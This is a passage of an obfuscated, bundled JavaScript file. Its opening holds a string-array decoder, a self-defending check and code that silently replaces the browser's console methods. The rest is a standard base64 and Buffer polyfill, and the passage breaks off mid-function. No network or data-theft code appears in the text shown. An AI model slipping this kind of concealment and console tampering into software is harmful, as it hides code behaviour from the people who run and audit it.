  var Rn = Pn;
  !(function (t) {
    for (
      var e = 416,
        n = 389,
        r = 412,
        o = 373,
        i = 413,
        s = 379,
        a = 394,
        u = 381,
        c = 404,
        l = 396,
        d = Pn,
        f = t();
      [];

    )
      try {
        if (
          224051 ===
          (parseInt(d(e)) / 1) * (-parseInt(d(n)) / 2) +
            (parseInt(d(r)) / 3) * (-parseInt(d(o)) / 4) +
            (-parseInt(d(i)) / 5) * (parseInt(d(s)) / 6) +
            (parseInt(d(a)) / 7) * (-parseInt(d(402)) / 8) +
            (parseInt(d(u)) / 9) * (-parseInt(d(385)) / 10) +
            -parseInt(d(c)) / 11 +
            parseInt(d(l)) / 12
        )
          break;
        f.push(f.shift());
      } catch (h) {
        f.push(f.shift());
      }
  })(qn);
  var On = (function () {
      var t = !![];
      return function (e, n) {
        var r = t
          ? function () {
              if (n) {
                var t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    Mn = On(void 0, function () {
      var t = 387,
        e = 384,
        n = 384,
        r = Pn;
      return Mn[r(409)]()
        [r(t)](r(e) + "+$")
        .toString()
        .constructor(Mn)
        .search(r(n) + "+$");
    });
  Mn();
  var Ln = (function () {
      var t = !![];
      return function (e, n) {
        var r = 383,
          o = t
            ? function () {
                if (n) {
                  var t = n[Pn(r)](e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
        return (t = ![]), o;
      };
    })(),
    Nn = Ln(void 0, function () {
      var t = 397,
        e = 395,
        n = 390,
        r = 374,
        o = 401,
        i = 414,
        s = 392,
        a = 405,
        u = 409,
        c = 380,
        l = 393,
        d = 382,
        f = 408,
        h = Pn,
        p = {};
      (p.pObHz = h(t)), (p.CbnkD = h(e));
      for (
        var m = p,
          g = (function () {
            var t,
              e = h;
            try {
              t = Function(e(c) + e(l) + (e(d) + e(386) + e(f) + " ));"))();
            } catch (n) {
              t = window;
            }
            return t;
          })(),
          y = (g[h(n)] = g.console || {}),
          w = ["log", m[h(r)], "info", h(o), m.CbnkD, h(i), "trace"],
          b = 0;
        b < w[h(s)];
        b++
      ) {
        var v = Ln.constructor.prototype[h(a)](Ln),
          A = w[b],
          k = y[A] || v;
        (v[h(415)] = Ln.bind(Ln)), (v[h(u)] = k.toString.bind(k)), (y[A] = v);
      }
    });
  Nn(),
    (window[Rn(410)] = function (t) {
      return function () {
        return t;
      };
    });
  var Dn =
    "undefined" != typeof globalThis
      ? globalThis
      : "undefined" != typeof window
      ? window
      : "undefined" != typeof global
      ? global
      : "undefined" != typeof self
      ? self
      : {};
  function Un(t) {
    var e = 398,
      n = 407,
      r = 375,
      o = Rn,
      i = {};
    i[o(403)] = "default";
    var s = i;
    return t && t.__esModule && Object.prototype[o(e) + o(n)].call(t, o(r))
      ? t[s.QBnWj]
      : t;
  }
  function qn() {
    var t = [
      "mtbZCMfrA04",
      "y3rVCIGICMv0Dq",
      "C2vHCMnO",
      "zM9YrwfJAa",
      "mtC3mtj5DxHfs04",
      "y29UC29Szq",
      "x19LC01VzhvSzq",
      "BgvUz3rO",
      "BMn0Aw9UkcKG",
      "n1nOAvf2Da",
      "zxHJzxb0Aw9U",
      "mJy3mte0mtjXCKvdz0W",
      "D2fYBG",
      "AgfZt3DUuhjVCa",
      "y2fSBa",
      "ChjVDg90ExbL",
      "zxjYB3i",
      "mJq5mZqXnLjsCMT4Da",
      "uujUv2O",
      "mZG1ntaZogjJuMHnrG",
      "yMLUza",
      "zNvUy3rPB24",
      "zxj0Eq",
      "CM4GDgHPCYiPka",
      "Dg9tDhjPBMC",
      "C2TdCNLWDa",
      "DMfSDwu",
      "m2DYwxLzzW",
      "mtyXnZe5mhz0CLjJBq",
      "DgfIBgu",
      "x19WCM90B19F",
      "ndzIA2P5wfm",
      "q0rkC24",
      "y29UC3rYDwn0BW",
      "nZmWodG4Avz5ANjx",
      "Ce9IshO",
      "zgvMyxvSDa",
      "A2v5CW",
      "zgvMAw5LuhjVCa",
      "mxWYFdr8m3W1Fa",
      "nMPKALPgEa",
      "CMv0DxjUicHMDq",
      "mZGZnJa2mxDNEM5Pyq",
      "E30Uy29UC3rYDq",
      "yxbWBhK",
      "kcGOlISPkYKRkq",
    ];
    return (qn = function () {
      return t;
    })();
  }
  function Wn(t) {
    var e = 391,
      n = 375,
      r = 377,
      o = 407,
      i = 400,
      s = 377,
      a = 372,
      u = Rn,
      c = {};
    (c.CDJsn = u(e)), (c.juMEo = u(406));
    for (var l = c, d = (u(378) + "0").split("|"), f = 0; []; ) {
      switch (d[f++]) {
        case "0":
          return m;
        case "1":
          if (Object.prototype[u(398) + "erty"].call(t, l.CDJsn)) return t;
          continue;
        case "2":
          var h = t[u(n)];
          continue;
        case "3":
          var p = {};
          (p[u(411)] = !![]), Object[u(r) + u(o)](m, l[u(417)], p);
          continue;
        case "4":
          if (typeof h == l.juMEo) {
            var m = function t() {
              var e = u;
              return this instanceof t
                ? Reflect.construct(h, arguments, this[e(a) + "r"])
                : h.apply(this, arguments);
            };
            m[u(i)] = h[u(400)];
          } else m = {};
          continue;
        case "5":
          Object.keys(t)[u(388)](function (e) {
            var n = u,
              r = Object.getOwnPropertyDescriptor(t, e);
            Object[n(s) + n(407)](
              m,
              e,
              r.get
                ? r
                : {
                    enumerable: !![],
                    get: function () {
                      return t[e];
                    },
                  }
            );
          });
          continue;
      }
      break;
    }
  }
  var zn,
    Kn = { exports: {} },
    Fn = {};
  function jn() {
    return (
      zn ||
        ((zn = 1),
        (function (t) {
          Object.defineProperties(t, {
            __esModule: { value: !0 },
            [Symbol.toStringTag]: { value: "Module" },
          });
          for (
            var e = {},
              n = {
                byteLength: function (t) {
                  var e = u(t),
                    n = e[0],
                    r = e[1];
                  return (3 * (n + r)) / 4 - r;
                },
                toByteArray: function (t) {
                  var e,
                    n,
                    r = u(t),
                    s = r[0],
                    a = r[1],
                    c = new i(
                      (function (t, e, n) {
                        return (3 * (e + n)) / 4 - n;
                      })(0, s, a)
                    ),
                    l = 0,
                    d = a > 0 ? s - 4 : s;
                  for (n = 0; n < d; n += 4)
                    (e =
                      (o[t.charCodeAt(n)] << 18) |
                      (o[t.charCodeAt(n + 1)] << 12) |
                      (o[t.charCodeAt(n + 2)] << 6) |
                      o[t.charCodeAt(n + 3)]),
                      (c[l++] = (e >> 16) & 255),
                      (c[l++] = (e >> 8) & 255),
                      (c[l++] = 255 & e);
                  2 === a &&
                    ((e =
                      (o[t.charCodeAt(n)] << 2) |
                      (o[t.charCodeAt(n + 1)] >> 4)),
                    (c[l++] = 255 & e));
                  1 === a &&
                    ((e =
                      (o[t.charCodeAt(n)] << 10) |
                      (o[t.charCodeAt(n + 1)] << 4) |
                      (o[t.charCodeAt(n + 2)] >> 2)),
                    (c[l++] = (e >> 8) & 255),
                    (c[l++] = 255 & e));
                  return c;
                },
                fromByteArray: function (t) {
                  for (
                    var e,
                      n = t.length,
                      o = n % 3,
                      i = [],
                      s = 16383,
                      a = 0,
                      u = n - o;
                    a < u;
                    a += s
                  )
                    i.push(l(t, a, a + s > u ? u : a + s));
                  1 === o
                    ? ((e = t[n - 1]),
                      i.push(r[e >> 2] + r[(e << 4) & 63] + "=="))
                    : 2 === o &&
                      ((e = (t[n - 2] << 8) + t[n - 1]),
                      i.push(
                        r[e >> 10] + r[(e >> 4) & 63] + r[(e << 2) & 63] + "="
                      ));
                  return i.join("");
                },
              },
              r = [],
              o = [],
              i = "undefined" != typeof Uint8Array ? Uint8Array : Array,
              s =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
              a = 0;
            a < 64;
            ++a
          )
            (r[a] = s[a]), (o[s.charCodeAt(a)] = a);
          function u(t) {
            var e = t.length;
            if (e % 4 > 0)
              throw new Error("Invalid string. Length must be a multiple of 4");
            var n = t.indexOf("=");
            return -1 === n && (n = e), [n, n === e ? 0 : 4 - (n % 4)];
          }
          function c(t) {
            return (
              r[(t >> 18) & 63] +
              r[(t >> 12) & 63] +
              r[(t >> 6) & 63] +
              r[63 & t]
            );
          }
          function l(t, e, n) {
            for (var r, o = [], i = e; i < n; i += 3)
              (r =
                ((t[i] << 16) & 16711680) +
                ((t[i + 1] << 8) & 65280) +
                (255 & t[i + 2])),
                o.push(c(r));
            return o.join("");
          }
          (o["-".charCodeAt(0)] = 62), (o["_".charCodeAt(0)] = 63);
          var d = {
            read: function (t, e, n, r, o) {
              var i,
                s,
                a = 8 * o - r - 1,
                u = (1 << a) - 1,
                c = u >> 1,
                l = -7,
                d = n ? o - 1 : 0,
                f = n ? -1 : 1,
                h = t[e + d];
              for (
                d += f, i = h & ((1 << -l) - 1), h >>= -l, l += a;
                l > 0;
                i = 256 * i + t[e + d], d += f, l -= 8
              );
              for (
                s = i & ((1 << -l) - 1), i >>= -l, l += r;
                l > 0;
                s = 256 * s + t[e + d], d += f, l -= 8
              );
              if (0 === i) i = 1 - c;
              else {
                if (i === u) return s ? NaN : (1 / 0) * (h ? -1 : 1);
                (s += Math.pow(2, r)), (i -= c);
              }
              return (h ? -1 : 1) * s * Math.pow(2, i - r);
            },
            write: function (t, e, n, r, o, i) {
              var s,
                a,
                u,
                c = 8 * i - o - 1,
                l = (1 << c) - 1,
                d = l >> 1,
                f = 23 === o ? Math.pow(2, -24) - Math.pow(2, -77) : 0,
                h = r ? 0 : i - 1,
                p = r ? 1 : -1,
                m = e < 0 || (0 === e && 1 / e < 0) ? 1 : 0;
              for (
                e = Math.abs(e),
                  isNaN(e) || e === 1 / 0
                    ? ((a = isNaN(e) ? 1 : 0), (s = l))
                    : ((s = Math.floor(Math.log(e) / Math.LN2)),
                      e * (u = Math.pow(2, -s)) < 1 && (s--, (u *= 2)),
                      (e += s + d >= 1 ? f / u : f * Math.pow(2, 1 - d)) * u >=
                        2 && (s++, (u /= 2)),
                      s + d >= l
                        ? ((a = 0), (s = l))
                        : s + d >= 1
                        ? ((a = (e * u - 1) * Math.pow(2, o)), (s += d))
                        : ((a = e * Math.pow(2, d - 1) * Math.pow(2, o)),
                          (s = 0)));
                o >= 8;
                t[n + h] = 255 & a, h += p, a /= 256, o -= 8
              );
              for (
                s = (s << o) | a, c += o;
                c > 0;
                t[n + h] = 255 & s, h += p, s /= 256, c -= 8
              );
              t[n + h - p] |= 128 * m;
            },
          };
          !(function (t) {
            const e = n,
              r = d,
              o =
                "function" == typeof Symbol && "function" == typeof Symbol.for
                  ? Symbol.for("nodejs.util.inspect.custom")
                  : null;
            (t.Buffer = l),
              (t.SlowBuffer = function (t) {
                +t != t && (t = 0);
                return l.alloc(+t);
              }),
              (t.INSPECT_MAX_BYTES = 50);
            const i = 2147483647;
            t.kMaxLength = i;
            const {
              Uint8Array: s,
              ArrayBuffer: a,
              SharedArrayBuffer: u,
            } = globalThis;
            function c(t) {
              if (t > i)
                throw new RangeError(
                  'The value "' + t + '" is invalid for option "size"'
                );
              const e = new s(t);
              return Object.setPrototypeOf(e, l.prototype), e;
            }
            function l(t, e, n) {
              if ("number" == typeof t) {
                if ("string" == typeof e)
                  throw new TypeError(
                    'The "string" argument must be of type string. Received type number'
                  );
                return p(t);
              }
              return f(t, e, n);
            }
            function f(t, e, n) {
              if ("string" == typeof t)
                return (function (t, e) {
                  ("string" == typeof e && "" !== e) || (e = "utf8");
                  if (!l.isEncoding(e))
                    throw new TypeError("Unknown encoding: " + e);
                  const n = 0 | w(t, e);
                  let r = c(n);
                  const o = r.write(t, e);
                  o !== n && (r = r.slice(0, o));
                  return r;
                })(t, e);
              if (a.isView(t))
                return (function (t) {
                  if (Q(t, s)) {
                    const e = new s(t);
                    return g(e.buffer, e.byteOffset, e.byteLength);
                  }
                  return m(t);
                })(t);
              if (null == t)
                throw new TypeError(
                  "The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " +
                    typeof t
                );
              if (Q(t, a) || (t && Q(t.buffer, a))) return g(t, e, n);
              if (void 0 !== u && (Q(t, u) || (t && Q(t.buffer, u))))
                return g(t, e, n);
              if ("number" == typeof t)
                throw new TypeError(
                  'The "value" argument must not be of type number. Received type number'
                );
              const r = t.valueOf && t.valueOf();
              if (null != r && r !== t) return l.from(r, e, n);
              const o = (function (t) {
                if (l.isBuffer(t)) {
                  const e = 0 | y(t.length),
                    n = c(e);
                  return 0 === n.length || t.copy(n, 0, 0, e), n;
                }
                if (void 0 !== t.length)
                  return "number" != typeof t.length || $(t.length)
                    ? c(0)
                    : m(t);
                if ("Buffer" === t.type && Array.isArray(t.data))
                  return m(t.data);
              })(t);
              if (o) return o;
              if (
                "undefined" != typeof Symbol &&
                null != Symbol.toPrimitive &&
                "function" == typeof t[Symbol.toPrimitive]
              )
                return l.from(t[Symbol.toPrimitive]("string"), e, n);
              throw new TypeError(
                "The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " +
                  typeof t
              );
            }
            function h(t) {
              if ("number" != typeof t)
                throw new TypeError('"size" argument must be of type number');
              if (t < 0)
                throw new RangeError(
                  'The value "' + t + '" is invalid for option "size"'
                );
            }
            function p(t) {
              return h(t), c(t < 0 ? 0 : 0 | y(t));
            }
            function m(t) {
              const e = t.length < 0 ? 0 : 0 | y(t.length),
                n = c(e);
              for (let r = 0; r < e; r += 1) n[r] = 255 & t[r];
              return n;
            }
            function g(t, e, n) {
              if (e < 0 || t.byteLength < e)
                throw new RangeError('"offset" is outside of buffer bounds');
              if (t.byteLength < e + (n || 0))
                throw new RangeError('"length" is outside of buffer bounds');
              let r;
              return (
                (r =
                  void 0 === e && void 0 === n
                    ? new s(t)
                    : void 0 === n
                    ? new s(t, e)
                    : new s(t, e, n)),
                Object.setPrototypeOf(r, l.prototype),
                r
              );
            }
            function y(t) {
              if (t >= i)
                throw new RangeError(
                  "Attempt to allocate Buffer larger than maximum size: 0x" +
                    i.toString(16) +
                    " bytes"
                );
              return 0 | t;
            }
            function w(t, e) {
              if (l.isBuffer(t)) return t.length;
              if (a.isView(t) || Q(t, a)) return t.byteLength;
              if ("string" != typeof t)
                throw new TypeError(
                  'The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' +
                    typeof t
                );
              const n = t.length,
                r = arguments.length > 2 && !0 === arguments[2];
              if (!r && 0 === n) return 0;
              let o = !1;
              for (;;)
                switch (e) {
                  case "ascii":
                  case "latin1":
                  case "binary":
                    return n;
                  case "utf8":
                  case "utf-8":
                    return Z(t).length;
                  case "ucs2":
                  case "ucs-2":
                  case "utf16le":
                  case "utf-16le":
                    return 2 * n;
                  case "hex":
                    return n >>> 1;
                  case "base64":
                    return J(t).length;
                  default:
                    if (o) return r ? -1 : Z(t).length;
                    (e = ("" + e).toLowerCase()), (o = !0);
                }
            }
            function b(t, e, n) {
              let r = !1;
              if (((void 0 === e || e < 0) && (e = 0), e > this.length))
                return "";
              if (
                ((void 0 === n || n > this.length) && (n = this.length), n <= 0)
              )
                return "";
              if ((n >>>= 0) <= (e >>>= 0)) return "";
              for (t || (t = "utf8"); ; )
                switch (t) {
                  case "hex":
                    return O(this, e, n);
                  case "utf8":
                  case "utf-8":
                    return E(this, e, n);
                  case "ascii":
                    return P(this, e, n);
                  case "latin1":
                  case "binary":
                    return R(this, e, n);
                  case "base64":
                    return B(this, e, n);
                  case "ucs2":
                  case "ucs-2":
                  case "utf16le":
                  case "utf-16le":
                    return M(this, e, n);
                  default:
                    if (r) throw new TypeError("Unknown encoding: " + t);
                    (t = (t + "").toLowerCase()), (r = !0);
                }
            }
            function v(t, e, n) {
              const r = t[e];
              (t[e] = t[n]), (t[n] = r);
            }
            function A(t, e, n, r, o) {
              if (0 === t.length) return -1;
              if (
                ("string" == typeof n
                  ? ((r = n), (n = 0))
                  : n > 2147483647
                  ? (n = 2147483647)
                  : n < -2147483648 && (n = -2147483648),
                $((n = +n)) && (n = o ? 0 : t.length - 1),
                n < 0 && (n = t.length + n),
                n >= t.length)
              ) {
                if (o) return -1;
                n = t.length - 1;
              } else if (n < 0) {
                if (!o) return -1;
                n = 0;
              }
              if (("string" == typeof e && (e = l.from(e, r)), l.isBuffer(e)))
                return 0 === e.length ? -1 : k(t, e, n, r, o);
              if ("number" == typeof e)
                return (
                  (e &= 255),
                  "function" == typeof s.prototype.indexOf
                    ? o
                      ? s.prototype.indexOf.call(t, e, n)
                      : s.prototype.lastIndexOf.call(t, e, n)
                    : k(t, [e], n, r, o)
                );
              throw new TypeError("val must be string, number or Buffer");
            }
            function k(t, e, n, r, o) {
              let i,
                s = 1,
                a = t.length,
                u = e.length;
              if (
                void 0 !== r &&
                ("ucs2" === (r = String(r).toLowerCase()) ||
                  "ucs-2" === r ||
                  "utf16le" === r ||
                  "utf-16le" === r)
              ) {
                if (t.length < 2 || e.length < 2) return -1;
                (s = 2), (a /= 2), (u /= 2), (n /= 2);
              }
              function c(t, e) {
                return 1 === s ? t[e] : t.readUInt16BE(e * s);
              }
              if (o) {
                let r = -1;
                for (i = n; i < a; i++)
                  if (c(t, i) === c(e, -1 === r ? 0 : i - r)) {
                    if ((-1 === r && (r = i), i - r + 1 === u)) return r * s;
                  } else -1 !== r && (i -= i - r), (r = -1);
              } else
                for (n + u > a && (n = a - u), i = n; i >= 0; i--) {
                  let n = !0;
                  for (let r = 0; r < u; r++)
                    if (c(t, i + r) !== c(e, r)) {
                      n = !1;
                      break;
                    }
                  if (n) return i;
                }
              return -1;
            }
            function I(t, e, n, r) {
              n = Number(n) || 0;
              const o = t.length - n;
              r ? (r = Number(r)) > o && (r = o) : (r = o);
              const i = e.length;
              let s;
              for (r > i / 2 && (r = i / 2), s = 0; s < r; ++s) {
                const r = parseInt(e.substr(2 * s, 2), 16);
                if ($(r)) return s;
                t[n + s] = r;
              }
              return s;
            }
            function S(t, e, n, r) {
              return Y(Z(e, t.length - n), t, n, r);
            }
            function _(t, e, n, r) {
              return Y(
                (function (t) {
                  const e = [];
                  for (let n = 0; n < t.length; ++n)
                    e.push(255 & t.charCodeAt(n));
                  return e;
                })(e),
                t,
                n,
                r
              );
            }
            function T(t, e, n, r) {
              return Y(J(e), t, n, r);
            }
            function C(t, e, n, r) {
              return Y(
                (function (t, e) {
                  let n, r, o;
                  const i = [];
                  for (let s = 0; s < t.length && !((e -= 2) < 0); ++s)
                    (n = t.charCodeAt(s)),
                      (r = n >> 8),
                      (o = n % 256),
                      i.push(o),
                      i.push(r);
                  return i;
                })(e, t.length - n),
                t,
                n,
                r
              );
            }
            function B(t, n, r) {
              return 0 === n && r === t.length
                ? e.fromByteArray(t)
                : e.fromByteArray(t.slice(n, r));
            }
            function E(t, e, n) {
              n = Math.min(t.length, n);
              const r = [];
              let o = e;
              for (; o < n; ) {
                const e = t[o];
                let i = null,
                  s = e > 239 ? 4 : e > 223 ? 3 : e > 191 ? 2 : 1;
                if (o + s <= n) {
                  let n, r, a, u;
                  switch (s) {
                    case 1:
                      e < 128 && (i = e);
                      break;
                    case 2:
                      (n = t[o + 1]),
                        128 == (192 & n) &&
                          ((u = ((31 & e) << 6) | (63 & n)),
                          u > 127 && (i = u));
                      break;
                    case 3:
                      (n = t[o + 1]),
                        (r = t[o + 2]),
                        128 == (192 & n) &&
                          128 == (192 & r) &&
                          ((u = ((15 & e) << 12) | ((63 & n) << 6) | (63 & r)),
                          u > 2047 && (u < 55296 || u > 57343) && (i = u));
                      break;
                    case 4:
                      (n = t[o + 1]),
                        (r = t[o + 2]),
                        (a = t[o + 3]),
                        128 == (192 & n) &&
                          128 == (192 & r) &&
                          128 == (192 & a) &&
                          ((u =
                            ((15 & e) << 18) |
                            ((63 & n) << 12) |
                            ((63 & r) << 6) |
                            (63 & a)),
                          u > 65535 && u < 1114112 && (i = u));
                  }
                }
                null === i
                  ? ((i = 65533), (s = 1))
                  : i > 65535 &&
                    ((i -= 65536),
                    r.push(((i >>> 10) & 1023) | 55296),
                    (i = 56320 | (1023 & i))),
                  r.push(i),
                  (o += s);
              }
              return (function (t) {
                const e = t.length;
                if (e <= x) return String.fromCharCode.apply(String, t);
                let n = "",
                  r = 0;
                for (; r < e; )
                  n += String.fromCharCode.apply(String, t.slice(r, (r += x)));
                return n;
              })(r);
            }
            (l.TYPED_ARRAY_SUPPORT = (function () {
              try {
                const t = new s(1),
                  e = {
                    foo: function () {
                      return 42;
                    },
                  };
                return (
                  Object.setPrototypeOf(e, s.prototype),
                  Object.setPrototypeOf(t, e),
                  42 === t.foo()
                );
              } catch (t) {
                return !1;
              }
            })()),
              l.TYPED_ARRAY_SUPPORT ||
                "undefined" == typeof console ||
                console.error,
              Object.defineProperty(l.prototype, "parent", {
                enumerable: !0,
                get: function () {
                  if (l.isBuffer(this)) return this.buffer;
                },
              }),
              Object.defineProperty(l.prototype, "offset", {
                enumerable: !0,
                get: function () {
                  if (l.isBuffer(this)) return this.byteOffset;
                },
              }),
              (l.poolSize = 8192),
              (l.from = function (t, e, n) {
                return f(t, e, n);
              }),
              Object.setPrototypeOf(l.prototype, s.prototype),
              Object.setPrototypeOf(l, s),
              (l.alloc = function (t, e, n) {
                return (function (t, e, n) {
                  return (
                    h(t),
                    t <= 0
                      ? c(t)
                      : void 0 !== e
                      ? "string" == typeof n
                        ? c(t).fill(e, n)
                        : c(t).fill(e)
                      : c(t)
                  );
                })(t, e, n);
              }),
              (l.allocUnsafe = function (t) {
                return p(t);
              }),
              (l.allocUnsafeSlow = function (t) {
                return p(t);
              }),
              (l.isBuffer = function (t) {
                return null != t && !0 === t._isBuffer && t !== l.prototype;
              }),
              (l.compare = function (t, e) {
                if (
                  (Q(t, s) && (t = l.from(t, t.offset, t.byteLength)),
                  Q(e, s) && (e = l.from(e, e.offset, e.byteLength)),
                  !l.isBuffer(t) || !l.isBuffer(e))
                )
                  throw new TypeError(
                    'The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array'
                  );
                if (t === e) return 0;
                let n = t.length,
                  r = e.length;
                for (let o = 0, i = Math.min(n, r); o < i; ++o)
                  if (t[o] !== e[o]) {
                    (n = t[o]), (r = e[o]);
                    break;
                  }
                return n < r ? -1 : r < n ? 1 : 0;
              }),
              (l.isEncoding = function (t) {
                switch (String(t).toLowerCase()) {
                  case "hex":
                  case "utf8":
                  case "utf-8":
                  case "ascii":
                  case "latin1":
                  case "binary":
                  case "base64":
                  case "ucs2":
                  case "ucs-2":
                  case "utf16le":
                  case "utf-16le":
                    return !0;
                  default:
                    return !1;
                }
              }),
              (l.concat = function (t, e) {
                if (!Array.isArray(t))
                  throw new TypeError(
                    '"list" argument must be an Array of Buffers'
                  );
                if (0 === t.length) return l.alloc(0);
                let n;
                if (void 0 === e)
                  for (e = 0, n = 0; n < t.length; ++n) e += t[n].length;
                const r = l.allocUnsafe(e);
                let o = 0;
                for (n = 0; n < t.length; ++n) {
                  let e = t[n];
                  if (Q(e, s))
                    o + e.length > r.length
                      ? (l.isBuffer(e) || (e = l.from(e)), e.copy(r, o))
                      : s.prototype.set.call(r, e, o);
                  else {
                    if (!l.isBuffer(e))
                      throw new TypeError(
                        '"list" argument must be an Array of Buffers'
                      );
                    e.copy(r, o);
                  }
                  o += e.length;
                }
                return r;
              }),
              (l.byteLength = w),
              (l.prototype._isBuffer = !0),
              (l.prototype.swap16 = function () {
                const t = this.length;
                if (t % 2 != 0)
                  throw new RangeError(
                    "Buffer size must be a multiple of 16-bits"
                  );
                for (let e = 0; e < t; e += 2) v(this, e, e + 1);
                return this;
              }),
              (l.prototype.swap32 = function () {
                const t = this.length;
                if (t % 4 != 0)
                  throw new RangeError(
                    "Buffer size must be a multiple of 32-bits"
                  );
                for (let e = 0; e < t; e += 4)
                  v(this, e, e + 3), v(this, e + 1, e + 2);
                return this;
              }),
              (l.prototype.swap64 = function () {
                const t = this.length;
                if (t % 8 != 0)
                  throw new RangeError(
                    "Buffer size must be a multiple of 64-bits"
                  );
                for (let e = 0; e < t; e += 8)
                  v(this, e, e + 7),
                    v(this, e + 1, e + 6),
                    v(this, e + 2, e + 5),
                    v(this, e + 3, e + 4);
                return this;
              }),
              (l.prototype.toString = function () {
                const t = this.length;
                return 0 === t
                  ? ""
                  : 0 === arguments.length
                  ? E(this, 0, t)
                  : b.apply(this, arguments);
              }),
              (l.prototype.toLocaleString = l.prototype.toString),
              (l.prototype.equals = function (t) {
                if (!l.isBuffer(t))
                  throw new TypeError("Argument must be a Buffer");
                return this === t || 0 === l.compare(this, t);
              }),
              (l.prototype.inspect = function () {
                let e = "";
                const n = t.INSPECT_MAX_BYTES;
                return (
                  (e = this.toString("hex", 0, n)
                    .replace(/(.{2})/g, "$1 ")
                    .trim()),
                  this.length > n && (e += " ... "),
                  "<Buffer " + e + ">"
                );
              }),
              o && (l.prototype[o] = l.prototype.inspect),
              (l.prototype.compare = function (t, e, n, r, o) {
                if (
                  (Q(t, s) && (t = l.from(t, t.offset, t.byteLength)),
                  !l.isBuffer(t))
                )
                  throw new TypeError(
                    'The "target" argument must be one of type Buffer or Uint8Array. Received type ' +
                      typeof t
                  );
                if (
                  (void 0 === e && (e = 0),
                  void 0 === n && (n = t ? t.length : 0),
                  void 0 === r && (r = 0),
                  void 0 === o && (o = this.length),
                  e < 0 || n > t.length || r < 0 || o > this.length)
                )
                  throw new RangeError("out of range index");
                if (r >= o && e >= n) return 0;
                if (r >= o) return -1;
                if (e >= n) return 1;
                if (this === t) return 0;
                let i = (o >>>= 0) - (r >>>= 0),
                  a = (n >>>= 0) - (e >>>= 0);
                const u = Math.min(i, a),
                  c = this.slice(r, o),
                  d = t.slice(e, n);
                for (let s = 0; s < u; ++s)
                  if (c[s] !== d[s]) {
                    (i = c[s]), (a = d[s]);
                    break;
                  }
                return i < a ? -1 : a < i ? 1 : 0;
              }),
              (l.prototype.includes = function (t, e, n) {
                return -1 !== this.indexOf(t, e, n);
              }),
              (l.prototype.indexOf = function (t, e, n) {
                return A(this, t, e, n, !0);
              }),
              (l.prototype.lastIndexOf = function (t, e, n) {
                return A(this, t, e, n, !1);
              }),
              (l.prototype.write = function (t, e, n, r) {
                if (void 0 === e) (r = "utf8"), (n = this.length), (e = 0);
                else if (void 0 === n && "string" == typeof e)
                  (r = e), (n = this.length), (e = 0);
                else {
                  if (!isFinite(e))
                    throw new Error(
                      "Buffer.write(string, encoding, offset[, length]) is no longer supported"
                    );
                  (e >>>= 0),
                    isFinite(n)
                      ? ((n >>>= 0), void 0 === r && (r = "utf8"))
                      : ((r = n), (n = void 0));
                }
                const o = this.length - e;
                if (
                  ((void 0 === n || n > o) && (n = o),
                  (t.length > 0 && (n < 0 || e < 0)) || e > this.length)
                )
                  throw new RangeError(
                    "Attempt to write outside buffer bounds"
                  );
                r || (r = "utf8");
                let i = !1;
                for (;;)
                  switch (r) {
                    case "hex":
                      return I(this, t, e, n);
                    case "utf8":
                    case "utf-8":
                      return S(this, t, e, n);
                    case "ascii":
                    case "latin1":
                    case "binary":
                      return _(this, t, e, n);
                    case "base64":
                      return T(this, t, e, n);
                    case "ucs2":
                    case "ucs-2":
                    case "utf16le":
                    case "utf-16le":
                      return C(this, t, e, n);
                    default:
                      if (i) throw new TypeError("Unknown encoding: " + r);
                      (r = ("" + r).toLowerCase()), (i = !0);
                  }
              }),
              (l.prototype.toJSON = function () {
                return {
                  type: "Buffer",
                  data: Array.prototype.slice.call(this._arr || this, 0),
                };
              });
            const x = 4096;
            function P(t, e, n) {
              let r = "";
              n = Math.min(t.length, n);
              for (let o = e; o < n; ++o) r += String.fromCharCode(127 & t[o]);
              return r;
            }
            function R(t, e, n) {
              let r = "";
              n = Math.min(t.length, n);
              for (let o = e; o < n; ++o) r += String.fromCharCode(t[o]);
              return r;
            }
            function O(t, e, n) {
              const r = t.length;
              (!e || e < 0) && (e = 0), (!n || n < 0 || n > r) && (n = r);
              let o = "";
              for (let i = e; i < n; ++i) o += tt[t[i]];
              return o;
            }
            function M(t, e, n) {
              const r = t.slice(e, n);
              let o = "";
              for (let i = 0; i < r.length - 1; i += 2)
                o += String.fromCharCode(r[i] + 256 * r[i + 1]);
              return o;
            }
            function L(t, e, n) {
              if (t % 1 != 0 || t < 0)
                throw new RangeError("offset is not uint");
              if (t + e > n)
                throw new RangeError("Trying to access beyond buffer length");
            }
            function N(t, e, n, r, o, i) {
              if (!l.isBuffer(t))
                throw new TypeError(
                  '"buffer" argument must be a Buffer instance'
                );
              if (e > o || e < i)
                throw new RangeError('"value" argument is out of bounds');
              if (n + r > t.length) throw new RangeError("Index out of range");
            }
            function D(t, e, n, r, o) {
              G(e, r, o, t, n, 7);
              let i = Number(e & BigInt(4294967295));
              (t[n++] = i),
                (i >>= 8),
                (t[n++] = i),
                (i >>= 8),
                (t[n++] = i),
                (i >>= 8),
                (t[n++] = i);
              let s = Number((e >> BigInt(32)) & BigInt(4294967295));
              return (
                (t[n++] = s),
                (s >>= 8),
                (t[n++] = s),
                (s >>= 8),
                (t[n++] = s),
                (s >>= 8),
                (t[n++] = s),
                n
              );
            }
            function U(t, e, n, r, o) {
              G(e, r, o, t, n, 7);
              let i = Number(e & BigInt(4294967295));
              (t[n + 7] = i),
                (i >>= 8),
                (t[n + 6] = i),
                (i >>= 8),
                (t[n + 5] = i),
                (i >>= 8),
                (t[n + 4] = i);
              let s = Number((e >> BigInt(32)) & BigInt(4294967295));
              return (
                (t[n + 3] = s),
                (s >>= 8),
                (t[n + 2] = s),
                (s >>= 8),
                (t[n + 1] = s),
                (s >>= 8),
                (t[n] = s),
                n + 8
              );
            }
            function q(t, e, n, r, o, i) {
              if (n + r > t.length) throw new RangeError("Index out of range");
              if (n < 0) throw new RangeError("Index out of range");
            }
            function W(t, e, n, o, i) {
              return (
                (e = +e),
                (n >>>= 0),
                i || q(t, 0, n, 4),
                r.write(t, e, n, o, 23, 4),
                n + 4
              );
            }
            function z(t, e, n, o, i) {
